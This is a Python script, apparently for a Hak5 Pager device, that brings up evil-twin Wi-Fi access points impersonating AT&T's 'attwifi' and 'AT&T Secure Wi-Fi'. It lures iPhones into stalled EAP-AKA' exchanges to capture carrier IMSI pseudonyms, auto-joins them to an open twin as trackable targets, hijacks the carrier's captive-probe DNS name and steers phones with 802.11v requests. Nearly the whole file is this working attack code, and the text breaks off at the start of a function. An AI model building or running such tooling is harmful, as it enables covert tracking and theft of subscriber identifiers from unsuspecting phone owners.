#!/usr/bin/env python3
"""
att-open-steer.py -- dual-network `attwifi` / `AT&T Secure Wi-Fi` iPhone
lure + pseudonym capture + open-AP connection.

WHAT THIS DOES
    Brings up TWO BSSs on the 2.4 GHz radio (phy0 / wlan0), both with
    universally-administered BSSIDs:

      1. `AT&T Secure Wi-Fi`  -- WPA2-Enterprise + Hotspot 2.0 / Passpoint
         IEs + local RADIUS. This is the phone's *managed enterprise*
         profile (per iOS Settings > Wi-Fi > Managed Networks). An
         AT&T-provisioned iPhone attempts EAP-AKA'/SIM here and sends its
         carrier NAI (IMSI pseudonym) as the EAP-Identity to our RADIUS
         server, which stalls the exchange (mode=broken). That captures the
         pseudonym and keeps the phone retrying.

      2. `attwifi`            -- truly OPEN (the phone's *managed open*
         profile). iPhone auto-joins this one for real, gets a DHCP lease,
         and becomes a persistent, pingable, RSSI-trackable target.

    Optionally, while a phone is on the enterprise BSS, we can steer it to
    the open twin with an 802.11v BSS Transition Management Request backed by
    an 802.11k neighbor report (hostapd `set_neighbor` + `bss_tm_req`).

WHY TWO DIFFERENT SSIDs
    iOS collapses two same-SSID BSSs of different security into one entry
    and prefers the secured one, and Hotspot 2.0 *requires* WPA2-Enterprise
    (hostapd refuses `hs20=1` on an open BSS). The carrier's `attwifi`
    profile is OPEN; its Passpoint/AKA profile is the separate
    `AT&T Secure Wi-Fi`. So the pseudonym lure must be `AT&T Secure Wi-Fi`
    and the connection target must be `attwifi`.

BSSID NOTE (critical)
    hostapd derives MACs from the radio base and flips the locally-
    administered bit on secondary BSSs (e.g. 0a:.../0e:...), which iOS
    silently filters. We set `wireless.radio0.macaddr_base` +
    `num_global_macaddr` so every vif gets a **universally-administered**
    MAC (00:13:37:xx:xx:xx). Proven live on the Pager.

STABILITY NOTE
    With default hostapd settings the iPhone associates, then is
    `deauthenticated due to inactivity` a few seconds later (the phone sits
    idle in the captive-portal state). We disable inactivity polling:
    `skip_inactivity_poll=1`, `disassoc_low_ack=0`, large `max_inactivity`.

SAFETY
    Reuses the WPAD-SWAP engine (wpad-wolfssl bind-mounted only while
    active; factory wpad always restored on exit). UCI + radio backups are
    restored in cleanup() (signal + atexit guarded).

USAGE
    att-open-steer.py [--no-isolate] [--steer-mode btm|deauth|both|off]
                      [--steer-always] [--radius-mode MODE] [--loot-dir DIR]
                      [--force]
"""

import argparse
import atexit
import os
import random
import re
import signal
import subprocess
import sys
import time
from datetime import datetime

# The Pager UI launches payloads with a minimal environment whose PATH does not
# include /usr/sbin, so bare `hostapd_cli` (and friends) fail with ENOENT when
# launched from the UI even though they work over SSH. Pin the standard Pager
# tool dirs so every subprocess resolves regardless of how we were started.
os.environ["PATH"] = "/usr/sbin:/usr/bin:/sbin:/bin:" + os.environ.get("PATH", "")

# ---------------------------------------------------------------------------
# interfaces / constants
# ---------------------------------------------------------------------------
AP_OPEN = "wlan0open"   # primary AP vif  -> open `attwifi`
AP_ENT  = "wlan0wpa"    # secondary AP vif -> `AT&T Secure Wi-Fi` (Passpoint)
AP_CLI  = "wlan0cli"

RADIO_OUI   = "00:13:37"
RADIO_BASE  = "00:13:37:ac:af:24"   # factory radio MAC (universal)
CHANNEL     = 6

SSID_OPEN = "attwifi"
SSID_ENT  = "AT&T Secure Wi-Fi"
# During bring-up the open BSS beacons this harmless placeholder so an AT&T
# iPhone does not auto-join `attwifi` before the captive stack (DNS override,
# NAT, WISPr) is ready -- which makes iOS drop it and disable auto-join. The
# live SSID is flipped to `attwifi` only once everything is up.
SSID_SETUP = "_att-open-steer"
# IE-221 vendor elements (Cisco 00:40:96, Aruba 00:1a:1e, Ruckus 00:1b:0d) that
# legacy AT&T open hotspots used. hostapd's `vendor_elements` is a concatenated
# hex string (no colons): each IE is  dd <len> <OUI:3> <vendor-data:4>  with
# len = 3 + 4 = 0x07. Set via UCI so it survives the activation `wifi reload`.
VENDOR_ELEMENTS = "dd0700409600000001dd07001a1e00000001dd07001b0d00000001"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


def _resolve_att_dir():
    for c in [os.environ.get("ATT_DIR", ""),
              "/mmc/root/payloads/user/Skinny-Tools/ATT",
              "/root/payloads/user/Skinny-Tools/ATT",
              os.path.join(os.path.dirname(SCRIPT_DIR), "ATT")]:
        if c and os.path.isfile(os.path.join(c, "radius-reject.py")):
            return c
    return "/mmc/root/payloads/user/Skinny-Tools/ATT"


ATT_DIR        = _resolve_att_dir()
RADIUS_SCRIPT  = os.path.join(ATT_DIR, "radius-reject.py")
IE221_SCRIPT   = os.path.join(ATT_DIR, "v28_ie221.py")
ISOLATE_SCRIPT = os.path.join(ATT_DIR, "v28_isolate.sh")
DHCPD_SCRIPT   = os.path.join(ATT_DIR, "v28_dhcpd.py")
WISPR_SCRIPT   = os.path.join(ATT_DIR, "v28_wispr.py")


def _resolve_wpad_swap():
    for c in [os.environ.get("WPAD_SWAP", ""),
              "/mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh",
              "/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh",
              os.path.join(SCRIPT_DIR, "wpad-swap.sh")]:
        if c and os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    return "/mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh"


WPAD_SCRIPT = _resolve_wpad_swap()

LOG_DIR = "/mmc/root/loot/att-open-steer"

# Backups live on persistent storage (/mmc), NOT /tmp: /tmp is cleared on
# reboot, which previously left the Pager stuck in the payload's modified
# wireless/pineapd state (the disable flags survived, the /tmp backup needed to
# restore them did not).
STATE_DIR     = "/mmc/root/.att-open-steer"
WIRELESS_BAK  = os.path.join(STATE_DIR, "wireless.bak")
DNSMASQ_BAK   = os.path.join(STATE_DIR, "dnsmasq.conf.bak")
RADIO_MAC_BAK = os.path.join(STATE_DIR, "radio-mac.bak")
PINEAP_BAK    = os.path.join(STATE_DIR, "pineapd.bak")

WISPR_PORT    = 80
RADIUS_SECRET = "testing123"

# The AT&T `attwifi` managed-open profile validates connectivity against this
# carrier-specific host over HTTP. We redirect ONLY this name to the Pager.
# Do NOT redirect `captive.apple.com`: iOS also probes it over HTTPS (443),
# and pointing it at the Pager (which has no TLS listener) yields a refused
# connection that makes iOS mark the whole network captive.
DNSMASQ_UCI   = "dhcp.@dnsmasq[0]"
DNSMASQ_PROBE = "attwifi.apple.com"
DNSMASQ_CONF  = "/etc/dnsmasq.conf"
DNSMASQ_MARK  = "# att-open-steer captive"
DNS_FALLBACK_MARK = "# att-open-steer dns-fallback"
DNS_FALLBACK_SERVERS = ("1.1.1.1", "8.8.8.8")


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(msg, log_fp=None):
    line = f"[{ts()}] {msg}"
    print(line)
    if log_fp:
        log_fp.write(line + "\n")
        log_fp.flush()


def shell_out(cmd, check=False):
    r = subprocess.run(cmd, shell=True, check=check, capture_output=True, text=True)
    return r.stdout.strip()


def uci_set(key, value):
    subprocess.run(f"uci set {key}='{value}'", shell=True, check=False)


def uci_del(key):
    subprocess.run(f"uci -q delete {key}", shell=True, check=False)


def uci_commit(target="wireless"):
    subprocess.run(f"uci commit {target}", shell=True, check=False)


def backup_file(path, bak_path):
    if os.path.exists(path) and not os.path.exists(bak_path):
        try:
            os.makedirs(os.path.dirname(bak_path), exist_ok=True)
        except OSError:
            pass
        with open(path, "rb") as src, open(bak_path, "wb") as dst:
            dst.write(src.read())
        return True
    return False


def wifi_reload():
    subprocess.run("wifi reload", shell=True, check=False)


def stop_pineapd():
    shell_out("killall -TERM pineapd 2>/dev/null; sleep 0.5; "
              "killall -KILL pineapd 2>/dev/null; true")


def kill_matching(pattern, log_fp=None):
    """Kill every process whose full cmdline matches `pattern`.

    The Pager's BusyBox has NO `pkill` ("applet not found"), so the original
    `pkill -f ...` cleanup silently did nothing: stale radius/wispr/dhcp
    processes stacked up, and a stale WISPr holding :80 made the next WISPr
    fail to bind, which made the whole payload exit. Use `pgrep -f` + `kill`.
    The pattern is written with a `[.]` so it cannot match the shell running
    pgrep itself.
    """
    pids = shell_out(f"pgrep -f '{pattern}' 2>/dev/null").split()
    me = os.getpid()
    killed = []
    for pid in pids:
        if pid.isdigit() and int(pid) != me:
            subprocess.run(f"kill -9 {pid} 2>/dev/null", shell=True, check=False)
            killed.append(pid)
    if log_fp and killed:
        log(f"[kill] {pattern} -> {killed}", log_fp)
    return killed


def start_pineapd():
    shell_out("/etc/init.d/pineapd start 2>/dev/null; true")


def wpad_swap(target, log_fp):
    if not os.path.isfile(WPAD_SCRIPT):
        log(f"[wpad] engine not found at {WPAD_SCRIPT}", log_fp)
        return False
    try:
        rc = subprocess.run([WPAD_SCRIPT, target],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            timeout=180).returncode
    except subprocess.TimeoutExpired:
        rc = 124
    log(f"[wpad] swap target={target} rc={rc}", log_fp)
    return rc == 0


def assert_safe_shell():
    if os.environ.get("ATT_FORCE_WLAN0CLI"):
        return
    conn = os.environ.get("SSH_CONNECTION", "").split()
    if not conn:
        return
    route = shell_out(f"ip route get {conn[0]} 2>/dev/null | head -1")
    if "dev wlan" in route or "dev wl" in route:
        sys.stderr.write(
            f"FATAL: SSH session arrives over WiFi ({route}).\n"
            "Use USB-C Ethernet or on-Pager tmux; set ATT_FORCE_WLAN0CLI=1 to override.\n")
        sys.exit(2)


def verify_bss_up(iface, timeout=90):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if "type AP" in shell_out(f"iw dev {iface} info 2>&1"):
            return True
        time.sleep(1)
    return False


def hostapd_cli(iface, *args, ctrl="/var/run/hostapd"):
    # Prefer the absolute path: the UI's minimal PATH may not include /usr/sbin.
    exe = "/usr/sbin/hostapd_cli" if os.path.exists("/usr/sbin/hostapd_cli") else "hostapd_cli"
    return subprocess.run([exe, "-p", ctrl, "-i", iface] + list(args),
                          capture_output=True, text=True).stdout.strip()


def bss_bssid(iface):
    out = hostapd_cli(iface, "status")
    for line in out.splitlines():
        if line.startswith("bssid[0]"):
            return line.split("=", 1)[1].strip()
    return ""


def stations(iface):
    """Associated station MACs on `iface`.

    Prefer `iw station dump` (reliable on this firmware); `hostapd_cli all_sta`
    can return empty even when a client is associated. Union both so we never
    miss a client.
    """
    macs = []
    seen = set()
    out = shell_out(f"iw dev {iface} station dump 2>/dev/null")
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Station "):
            m = line.split()[1].lower()
            if len(m) == 17 and m.count(":") == 5 and m not in seen:
                seen.add(m)
                macs.append(m)
    out = hostapd_cli(iface, "all_sta")
    for line in out.splitlines():
        line = line.strip()
        if len(line) == 17 and line.count(":") == 5:
            m = line.lower()
            if m not in seen:
                seen.add(m)
                macs.append(m)
    return macs


# ---------------------------------------------------------------------------
# UCI configuration
# ---------------------------------------------------------------------------
def set_radio_macs(log_fp):
    """Force universally-administered MACs for every AP vif. Without the
    locally-administered bit flip, iOS accepts our BSSIDs."""
    uci_set("wireless.radio0.macaddr_base", RADIO_BASE)
    uci_set("wireless.radio0.num_global_macaddr", "4")
    log(f"[radio] macaddr_base={RADIO_BASE} num_global_macaddr=4", log_fp)


def follow_uplink_channel(log_fp):
    """Put the AP radio on the same channel as the client-mode uplink.

    AP and STA share phy0, so the radio can only sit on one channel. If the
    AP is forced to a fixed channel (the old hardcoded 6) it drags the STA off
    its network -- which is why switching client mode to a different SSID/
    channel broke the uplink. Set radio0.channel from the associated STA (or
    leave the configured value if there is no uplink/unknown).
    """
    ifc = sta_iface() or op_iface()
    ch = iface_channel(ifc)
    if ch:
        uci_set("wireless.radio0.channel", str(ch))
        uci_commit("wireless")
        log(f"[radio] radio0.channel={ch} (following STA {ifc})", log_fp)
    else:
        log(f"[radio] no STA channel detected on {ifc}; leaving channel as configured", log_fp)


def configure_open_bss(log_fp):
    """Open BSS -- the phone's managed-OPEN profile; the connect target.
    Beacons a placeholder SSID during setup; activate_open_ssid() flips it to
    `attwifi` once DNS/WISPr/NAT are ready. Keep inactivity timeouts off so
    the phone stays put."""
    uci_set("wireless.wlan0open.ssid", SSID_SETUP)
    uci_set("wireless.wlan0open.encryption", "none")
    uci_set("wireless.wlan0open.hidden", "0")
    uci_set("wireless.wlan0open.disabled", "0")
    # stability: never deauth an idle (captive-portal) phone
    uci_set("wireless.wlan0open.skip_inactivity_poll", "1")
    uci_set("wireless.wlan0open.disassoc_low_ack", "0")
    uci_set("wireless.wlan0open.max_inactivity", "86400")
    # Legacy AT&T-hotspot IE-221 vendor OUIs (survives wifi reload via UCI).
    uci_set("wireless.wlan0open.vendor_elements", VENDOR_ELEMENTS)
    # The 802.11k/v options (ieee80211k/bss_transition/rrm_neighbor_report) are
    # compiled only into wpad-wolfssl. On the factory wpad they make hostapd
    # reject the whole BSS ("unknown configuration item 'bss_transition'" ->
    # "hostapd.add_iface failed"), so the open attwifi AP never beacons and the
    # phone cannot associate. They are not needed on the open BSS (steering,
    # when used, targets the enterprise BSS), so drop them.
    for k in ("ieee80211k", "bss_transition", "rrm_neighbor_report"):
        uci_del(f"wireless.wlan0open.{k}")
    uci_commit()
    log(f"[open] {AP_OPEN} = open {SSID_SETUP!r} (placeholder; attwifi on ready)", log_fp)


def activate_open_ssid(log_fp):
    """Flip the open BSS from the placeholder to `attwifi`.

    On this firmware `hostapd_cli set ssid` only updates hostapd's internal
    config -- the kernel beacon keeps the old SSID, so iPhones that match
    passively never see `attwifi`. A `wifi reload` with UCI=attwifi DOES
    regenerate the conf and put `attwifi` on the air, so use that. It briefly
    restarts the client STA; we re-apply the uplink immediately after and
    re-inject the idle-hold + IE-221 (which a reload wipes).
    """
    uci_set("wireless.wlan0open.ssid", SSID_OPEN)
    uci_set("wireless.wlan0open.hidden", "0")
    uci_commit("wireless")
    wifi_reload()
    # Get the client uplink back ASAP (static re-apply beats waiting on DHCP).
    reapply_uplink(log_fp)
    if not verify_bss_up(AP_OPEN, timeout=60):
        log("[WARN] open BSS did not come back after attwifi activation", log_fp)
    restore_uplink(log_fp)
    # NOTE: do NOT HUP hostapd here. The reload just regenerated the conf from
    # UCI (which carries skip_inactivity_poll / max_inactivity), and a follow-up
    # HUP on this driver tears the freshly-created BSS back down (wlan0open is
    # left as an unconfigured AP). Stability settings come from UCI instead.
    log(f"[bss] {SSID_OPEN!r} is now LIVE on {AP_OPEN} "
        f"bssid={bss_bssid(AP_OPEN)}", log_fp)


def configure_ent_bss(log_fp):
    """`AT&T Secure Wi-Fi` -- WPA2-Enterprise + HS2.0 Passpoint lure. The
    carrier enterprise profile doing EAP-AKA' lives on this SSID."""
    uci_set("wireless.wlan0wpa.ssid", SSID_ENT)
    uci_set("wireless.wlan0wpa.encryption", "wpa2")
    uci_set("wireless.wlan0wpa.wpa_key_mgmt", "WPA-EAP")
    uci_set("wireless.wlan0wpa.ieee8021x", "1")
    uci_set("wireless.wlan0wpa.eap_type", "aka")
    uci_set("wireless.wlan0wpa.auth_server", "127.0.0.1")
    uci_set("wireless.wlan0wpa.auth_port", "1812")
    uci_set("wireless.wlan0wpa.auth_secret", RADIUS_SECRET)
    uci_set("wireless.wlan0wpa.iw_enabled", "1")
    uci_set("wireless.wlan0wpa.iw_internet", "1")
    uci_set("wireless.wlan0wpa.iw_access_network_type", "2")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_roaming_consortium")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_roaming_consortium=310410")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_roaming_consortium=506F9A")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_nai_realm")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_nai_realm=0,att.net,*,23")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_nai_realm=1,att.net,*,50")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_domain_name")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_domain_name=att.net")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_domain_name=attwireless.net")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net=310,410")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net=310,260")
    uci_set("wireless.wlan0wpa.iw_venue_group", "2")
    uci_set("wireless.wlan0wpa.iw_venue_type", "8")
    uci_set("wireless.wlan0wpa.iw_venue_name", "eng:ATandT-Secure-WiFi")
    uci_set("wireless.wlan0wpa.iw_venue_url", "https://www.att.com/wifi")
    uci_set("wireless.wlan0wpa.hs20", "1")
    uci_set("wireless.wlan0wpa.hs20_oper_friendly_name", "eng:ATandT-Secure-WiFi")
    uci_set("wireless.wlan0wpa.hs20_conn_capab", "6:1:1")
    uci_set("wireless.wlan0wpa.disable_dgaf", "1")
    uci_set("wireless.wlan0wpa.hs20_deauth_req_timeout", "60")
    uci_set("wireless.wlan0wpa.ieee80211k", "1")
    uci_set("wireless.wlan0wpa.bss_transition", "1")
    uci_set("wireless.wlan0wpa.rrm_neighbor_report", "1")
    uci_set("wireless.wlan0wpa.time_advertisement", "1")
    # stability while authenticating/stalling
    uci_set("wireless.wlan0wpa.skip_inactivity_poll", "1")
    uci_set("wireless.wlan0wpa.disassoc_low_ack", "0")
    uci_set("wireless.wlan0wpa.max_inactivity", "86400")
    uci_set("wireless.wlan0wpa.disabled", "0")
    uci_commit()
    log(f"[ent] {AP_ENT} = Passpoint {SSID_ENT!r}", log_fp)


def _dnsmasq_conf_strip():
    """Remove any lines we previously added to /etc/dnsmasq.conf."""
    if not os.path.exists(DNSMASQ_CONF):
        return
    with open(DNSMASQ_CONF) as f:
        lines = f.readlines()
    keep = [l for l in lines
            if DNSMASQ_MARK not in l and DNSMASQ_PROBE not in l
            and DNS_FALLBACK_MARK not in l
            and not any(f"server={s}" in l for s in DNS_FALLBACK_SERVERS)]
    with open(DNSMASQ_CONF, "w") as f:
        f.writelines(keep)


def install_dnsmasq_captive(server_ip, log_fp):
    """Redirect the iPhone's AT&T captive-probe host to the Pager.

    Must use the ACTIVE dnsmasq config: the running dnsmasq is started with
    `-C /var/etc/dnsmasq.conf.cfg*`, so editing /etc/dnsmasq.conf alone and
    HUP'ing was a no-op. We (1) set the UCI `address` list, which the OpenWrt
    init script renders as `address=/host/ip`, and (2) append a raw `local=`
    line to /etc/dnsmasq.conf (which the generated config `conf-file`s) so
    dnsmasq is authoritative for the name and the real SVCB/HTTPS (type 65)
    record cannot leak a real Apple IP that iOS would then connect to.

    `captive.apple.com` is deliberately NOT touched -- iOS probes it over
    HTTPS too, and hijacking it to a host with no 443 listener makes iOS treat
    the network as captive.
    """
    for v in shell_out(f"uci -q get {DNSMASQ_UCI}.address 2>/dev/null").split():
        if DNSMASQ_PROBE in v:
            subprocess.run(f"uci -q del_list {DNSMASQ_UCI}.address='{v}'",
                           shell=True, check=False)
    subprocess.run(
        f"uci add_list {DNSMASQ_UCI}.address='/{DNSMASQ_PROBE}/{server_ip}'",
        shell=True, check=False)
    uci_commit("dhcp")

    _dnsmasq_conf_strip()
    with open(DNSMASQ_CONF, "a") as f:
        f.write(f"\n{DNSMASQ_MARK}\nlocal=/{DNSMASQ_PROBE}/\n")

    shell_out("/etc/init.d/dnsmasq restart >/dev/null 2>&1; true")
    log(f"[dnsmasq] {DNSMASQ_PROBE} -> {server_ip} (active config + local)", log_fp)


def remove_dnsmasq_captive(log_fp):
    for v in shell_out(f"uci -q get {DNSMASQ_UCI}.address 2>/dev/null").split():
        if DNSMASQ_PROBE in v:
            subprocess.run(f"uci -q del_list {DNSMASQ_UCI}.address='{v}'",
                           shell=True, check=False)
    uci_commit("dhcp")
    _dnsmasq_conf_strip()
    shell_out("/etc/init.d/dnsmasq restart >/dev/null 2>&1; true")
    log("[dnsmasq] captive override removed", log_fp)


def _dnsmasq_fallback_strip():
    """Remove ONLY the DNS-fallback lines we added (never the captive override)."""
    if not os.path.exists(DNSMASQ_CONF):
        return
    with open(DNSMASQ_CONF) as f:
        lines = f.readlines()
    keep = [l for l in lines
            if DNS_FALLBACK_MARK not in l
            and not any(f"server={s}" in l for s in DNS_FALLBACK_SERVERS)]
    with open(DNSMASQ_CONF, "w") as f:
        f.writelines(keep)


def ensure_dns_fallback(log_fp):
    """If the client-mode uplink handed us no upstream resolver, add public
    DNS servers to dnsmasq so downstream clients (and the iPhone's secondary
    reachability check) can still resolve. Works for any uplink/subnet."""
    auto = shell_out("cat /tmp/resolv.conf.d/resolv.conf.auto 2>/dev/null")
    if not re.search(r"nameserver\s+\d", auto):
        _dnsmasq_fallback_strip()
        with open(DNSMASQ_CONF, "a") as f:
            f.write(f"\n{DNS_FALLBACK_MARK}\n")
            for s in DNS_FALLBACK_SERVERS:
                f.write(f"server={s}\n")
        shell_out("/etc/init.d/dnsmasq restart >/dev/null 2>&1; true")
        log(f"[dnsmasq] uplink has no resolver; added fallback {DNS_FALLBACK_SERVERS}", log_fp)
    else:
        log("[dnsmasq] uplink resolver present", log_fp)


# ---------------------------------------------------------------------------
# PineAP: stop it beaconing competing SSIDs (notably `attwifi`)
# ---------------------------------------------------------------------------
def disable_pineap(log_fp):
    """Stop PineAP from broadcasting competing SSIDs while the lure is up.

    PineAP's SSID pool auto-populates (autossidpool=1) and by the time we run
    it contains `attwifi` and `AT&T Secure Wi-Fi` from recon. With the engine
    enabled PineAP injects those as extra BSSIDs (wlan1mon, 2.4+5 GHz), so iOS
    sees multiple `attwifi` BSSIDs, roams onto a fake with no captive server,
    and marks the network bad (disabling auto-join). We disable the engine and
    the injection interfaces for the duration; restored on cleanup.
    """
    backup_file("/etc/config/pineapd", PINEAP_BAK)
    for key, val in (
        ("pineapd.@hostapd[0].pineap_disabled", "1"),
        ("pineapd.@hostapd[0].pineape_disabled", "1"),
        ("pineapd.@pineapd[0].autossidpool", "0"),
        ("pineapd.wlan0mon.disable", "1"),
        ("pineapd.wlan1mon.disable", "1"),
        ("pineapd.wlan2mon.disable", "1"),
    ):
        uci_set(key, val)
    uci_commit("pineapd")
    shell_out("/etc/init.d/pineapd restart >/dev/null 2>&1; true")
    log("[pineap] engine/injection disabled (no competing attwifi beacons)", log_fp)


def restore_pineap(log_fp):
    if os.path.exists(PINEAP_BAK):
        subprocess.run(["cp", PINEAP_BAK, "/etc/config/pineapd"], check=False)
        os.remove(PINEAP_BAK)
        shell_out("/etc/init.d/pineapd restart >/dev/null 2>&1; true")
        log("[pineap] config restored", log_fp)


# ---------------------------------------------------------------------------
# internet routing: give the phone's network DHCP-DNS + NAT out the uplink
# ---------------------------------------------------------------------------
def managed_ifaces():
    """All managed (station-capable) interfaces, from `iw dev`.

    Concrete names differ per Pager/firmware (wlan0cli, wlan1cli, wlan2cli,
    ...), so never hardcode the client-mode interface.
    """
    out = shell_out("iw dev 2>/dev/null")
    ifs = []
    cur = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            cur = line.split()[1]
        elif line.startswith("type ") and cur:
            if line.split()[1] in ("managed", "station"):
                ifs.append(cur)
    return ifs


def sta_iface():
    """The associated client-mode (STA) interface, or '' if none."""
    for ifc in managed_ifaces():
        link = shell_out(f"iw dev {ifc} link 2>/dev/null")
        if "Connected to" in link or "SSID:" in link:
            return ifc
    return ""


def op_iface():
    """Best-effort client-mode uplink interface even when not associated yet."""
    return sta_iface() or (managed_ifaces()[0] if managed_ifaces() else "wlan0cli")


def iface_channel(ifc):
    """Current channel number of an interface, or None."""
    if not ifc:
        return None
    out = shell_out(f"iw dev {ifc} info 2>/dev/null")
    m = re.search(r"channel (\d+)", out)
    if m:
        return int(m.group(1))
    # Fall back to the link's frequency.
    out = shell_out(f"iw dev {ifc} link 2>/dev/null")
    f = re.search(r"freq:\s*(\d+)", out)
    if f:
        return _freq_to_ch(int(f.group(1)))
    return None


def uplink_iface():
    """The Pager's current internet uplink interface (client Wi-Fi / eth).

    Parse ONLY the `default via ... dev X` route; ignore link-scope routes.
    Falls back to the associated STA interface before it has a route.
    """
    out = shell_out("ip route show default 2>/dev/null")
    for line in out.splitlines():
        parts = line.split()
        if parts[:1] == ["default"] and "dev" in parts:
            return parts[parts.index("dev") + 1]
    return ""


def uplink_subnet():
    """CIDR of the uplink's IPv4 address, or ''."""
    up = uplink_iface()
    if not up:
        return ""
    out = shell_out(f"ip -o -4 addr show {up} 2>/dev/null")
    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+/\d+)", out)
    return m.group(1) if m else ""


def warn_on_overlap(log_fp):
    """The AP gateway (br-lan 172.16.52.0/24) must not share the uplink's
    subnet, or the phone's traffic is routed to the wrong interface."""
    cidr = uplink_subnet()
    if not cidr:
        return
    net = cidr.split("/")[0].rsplit(".", 1)[0]
    if net == "172.16.52":
        log(f"[net] WARNING: uplink subnet {cidr} overlaps br-lan "
            "172.16.52.0/24; passthrough may break", log_fp)


def bring_up_client(log_fp):
    """Ask netifd to (re)bring up the client-mode interface, then wait for the
    STA to associate. Works for any client-mode SSID/subnet."""
    ifc = op_iface()
    # Already associated (e.g. right after a reload): don't restart DHCP and
    # throw away a good link.
    if "Connected to" in shell_out(f"iw dev {ifc} link 2>/dev/null"):
        return ifc
    shell_out("ifup cli >/dev/null 2>&1; true")
    shell_out("ubus call network.interface.cli up >/dev/null 2>&1; true")
    deadline = time.time() + 20
    while time.time() < deadline:
        if "Connected to" in shell_out(f"iw dev {ifc} link 2>/dev/null"):
            return ifc
        time.sleep(1)
    return ifc


def restore_uplink(log_fp, timeout=70):
    """Wait for the client-WiFi uplink to have a default route, actively
    re-requesting DHCP and, failing that, re-applying the snapshotted static
    address so the phone keeps real internet."""
    deadline = time.time() + timeout
    nudged = False
    reapplied = False
    upif = bring_up_client(log_fp)
    while time.time() < deadline:
        up = uplink_iface()
        if up and up not in ("br-lan", "br-att"):
            log(f"[net] uplink up: {up}", log_fp)
            warn_on_overlap(log_fp)
            return True
        # Re-read the STA (association may have moved to another iface).
        upif = sta_iface() or upif or op_iface()
        if upif and not nudged:
            log(f"[net] nudging DHCP on {upif}", log_fp)
            shell_out(f"killall udhcpc 2>/dev/null; "
                      f"udhcpc -i {upif} -n -q -t 5 >/dev/null 2>&1; true")
            nudged = True
        elif not reapplied and _UPLINK_SNAP.get("addr"):
            # DHCP gave up; fall back to the address the uplink had before.
            reapply_uplink(log_fp)
            reapplied = True
        else:
            shell_out("wifi up >/dev/null 2>&1; true")
            bring_up_client(log_fp)
        time.sleep(3)
    # one last hard attempt
    if _UPLINK_SNAP.get("addr"):
        reapply_uplink(log_fp)
    ok = uplink_iface() not in ("", None, "br-lan", "br-att")
    if ok:
        warn_on_overlap(log_fp)
    else:
        log("[net] WARNING: uplink still down; phone may lack internet", log_fp)
    return ok


_net_rules = {"key": None}


def _routing_bridges(ap_ifaces):
    bridges = set()
    for ifc in ap_ifaces:
        m = shell_out(f"ip link show {ifc} 2>/dev/null | grep -o 'master [a-z0-9-]*'")
        if m:
            bridges.add(m.split()[1])
    return bridges or {"br-lan"}


def ensure_internet_routing(ap_ifaces, log_fp, force=False):
    """NAT + forward the AP networks out the real uplink.

    Hak5's fw4 may omit the client-Wi-Fi uplink from the wan-zone NAT so
    downstream clients get an IP but no internet -> iOS drops the network.
    Tracks the (uplink, bridges) key so a changed uplink (new client-mode
    network with a different iface/zone) re-applies cleanly: on change we
    reload the firewall to discard stale oifname rules, then re-add.
    """
    up = uplink_iface()
    if not up or up in ("br-lan", "br-att"):
        return False

    bridges = _routing_bridges(ap_ifaces)
    key = up + "|" + ",".join(sorted(bridges))
    if _net_rules["key"] == key and not force:
        return True

    if _net_rules["key"] and _net_rules["key"] != key:
        # Uplink changed: regenerate fw4 so our old oifname rules do not linger.
        log(f"[net] uplink changed ({_net_rules['key']} -> {key}); reloading firewall", log_fp)
        shell_out("/etc/init.d/firewall reload >/dev/null 2>&1; true")

    ruleset = shell_out("nft list ruleset 2>/dev/null")
    for br in sorted(bridges):
        # forward accept AP-bridge -> uplink (inserted before the drop policy)
        already_fwd = f'iifname "{br}" oifname "{up}"' in ruleset
        if not already_fwd:
            shell_out(f'nft insert rule inet fw4 forward iifname "{br}" '
                      f'oifname "{up}" accept 2>/dev/null; true')
        # masquerade AP-bridge traffic out the uplink
        already_masq = f'oifname "{up}"' in ruleset and "masquerade" in ruleset
        if not already_masq:
            shell_out(f'nft add rule inet fw4 srcnat oifname "{up}" '
                      f'meta nfproto ipv4 masquerade 2>/dev/null; true')
        log(f"[net] routed {br} -> {up} (NAT + forward)", log_fp)

    shell_out("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1; true")
    _net_rules["key"] = key
    return True


# ---------------------------------------------------------------------------
# 802.11k/v steering (enterprise BSS -> open BSS)
# ---------------------------------------------------------------------------
def _freq_to_ch(freq):
    if freq == 2484:
        return 14
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    return freq


def open_bss_channel():
    out = hostapd_cli(AP_OPEN, "status")
    for line in out.splitlines():
        if line.startswith("freq="):
            try:
                return _freq_to_ch(int(line.split("=", 1)[1]))
            except Exception:
                pass
    return CHANNEL


def add_neighbor_for_open(target_mac):
    ob = bss_bssid(AP_OPEN)
    if not ob:
        return False, "no open bssid"
    ch = open_bss_channel()
    # nr = bssid(6) bssid_info(4) op_class(1) channel(1) phy_type(1)
    nr = (ob.replace(":", "") + "00000051" + f"{81:02x}{ch:02x}08")
    ssid_hex = SSID_OPEN.encode().hex()
    out = hostapd_cli(AP_ENT, "set_neighbor", target_mac,
                      f"ssid={ssid_hex}", f"nr={nr}")
    return ("FAIL" not in out.upper()), f"set_neighbor {ob} ch={ch} -> {out!r}"


def send_btm(target_mac, disassoc_timer=5, valid_int=30):
